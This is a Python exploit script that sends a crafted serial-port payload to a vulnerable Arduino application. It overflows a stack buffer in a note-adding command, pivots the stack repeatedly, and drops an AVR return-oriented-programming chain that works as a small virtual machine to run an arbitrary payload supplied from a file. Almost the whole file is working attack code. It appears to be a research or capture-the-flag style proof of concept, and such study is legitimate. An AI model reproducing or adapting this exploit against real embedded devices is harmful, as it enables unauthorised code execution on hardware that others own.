import serial
import time
import struct
import sys

"""
	Exploits the vulnerable application running on the ardino, pass the binary payload you want executed by the VM
"""
args = sys.argv[1:]

ser = serial.Serial("/dev/ttyUSB0", 38400)
ser.flush()

def doMenu():
	# A selects the add note command which is vulnerbale to a stack buffer overflow
	ser.write("A\x0D")
	time.sleep(1)

def doLength(length):
	# Sends the length of the data we will download to the device
	ser.write(str(length))
	ser.write("\x0D")
	time.sleep(0.1)

def stackPiv(sp):
	# Pivots the stack and returns to the vulnerable funcition
	ser.write("\x00\x01\xa9")		# back to the vulnerable function
	ser.write("A"*1001)				# JUNK
	ser.write("\xde\xad\xbe\xef") 	# popped JUNK
	ser.write("\x00\x00\xb3")		# pop r11; pop r10; out SPH, r11; out SPL, r10; pivot stack
	ser.write(sp+"\xba\xbe")		# sp is where we move the stack to, rest is junk
	ser.write("\x00"*6)				# JUNK
	time.sleep(0.3)

def doPiv(sp):
	# Converts next stack pivot destination address to 4 bytes
 	print "Pivoting Stack: 0x%0.2X" % sp
	sp = struct.pack(">h", sp)
	doLength(1020)
	stackPiv(sp)

def doVM(sp, payloadSize, scratchSize):
	# caluclates the amount of data we will download to the deivice
	sp = struct.pack(">h", sp)
	doLength(1137+payloadSize+scratchSize)
	dropVM(sp)

def dropVM(sp):
	# Downloads the VM ROP chain and final stack pivot
	print "Dropping the VM ROP Chain"
	ser.write("\x00\x00\xab") 		# pop YH; pop YL; ld XH, Y+; ld XL, Y; pop pointer to code and dereference it into X
	ser.write("\x07\x00")			# 0x700 is where we will drop our payload
	ser.write("\x00\x00\xb0")		# in r10, SPL; in r11 SPH; Save satckpointer for .vm_loop
	ser.write("\x00\x00\xb8")		# ld YH, X+; ld YL, X+; main VM loop.. get virtual register <- .vm_loop
	ser.write("\x00\x00\xbb")		# ld ZH, Y+; ld ZL, Y; get value in virtual register
	ser.write("\x00\x00\xbe")		# ld YH, X+; ld YL, X+; get offset
	ser.write("\x00\x00\xc1")		# add ZL, YL; adc ZH, YH; add value in virtual register to offset
	ser.write("\x00\x00\xc4")		# ld r23, Z; get byte to write
	ser.write("\x00\x00\xb8")		# ld YH, X+; ld YL, X+; get virtual register
	ser.write("\x00\x00\xbb")		# ld ZH, Y+; ld ZL, Y; get value in virtual register
	ser.write("\x00\x00\xbe")		# ld YH, X+; ld YL, X+; get offset
	ser.write("\x00\x00\xc1")		# add ZL, YL; adc ZH, YH; add value in virtual register to offset
	ser.write("\x00\x00\xc6")		# st Z, r24; Write byte to destination
	ser.write("\x00\x00\xb5")		# out SPH, r11; out SPL, r10; jmp back to start to rop chain .vm_loop
									# STACK PIVOT
	ser.write("A"*(963))			# JUNK
	ser.write("\xde\xad\xbe\xef") 	# popped JUNK
	ser.write("\x00\x00\xb3")		# pop r11; pop r10; out SPH, r11; out SPL, r10; pivot stack
	ser.write(sp+"\xba\xbe")		# sp is where we move the stack to, rest is junk
	ser.write("\xff"*122)			# JUNK to align our payload

def dropCode(payload):
	# Downloads the data and operands
	print "Dropping mov instuctions"
	for byte in payload:
		ser.write(byte)
	return

def buildScratch(scratchSize):
	# Zero fills the scratch space
	i = 0
	while i < scratchSize:
		ser.write("\x00")
		i+=1
	ser.write("N")


with open(args[0]) as payloadFile:
	payload = payloadFile.read()


doMenu() # Get us to the buffer overflow

sp = 0x1E09
while(sp > 0x500): # We need to grwo the stack a buch of times so we have enough space for our VM, data and operands 
 	doPiv(sp)
 	sp -= 0x3ED

doVM(sp, len(payload), 0x1000) # Set up the VM ropchain and final stack pivot
dropCode(payload) # Drops the data and VM operands provided by the payload file
buildScratch(0x1000) # zero fill our scratch space.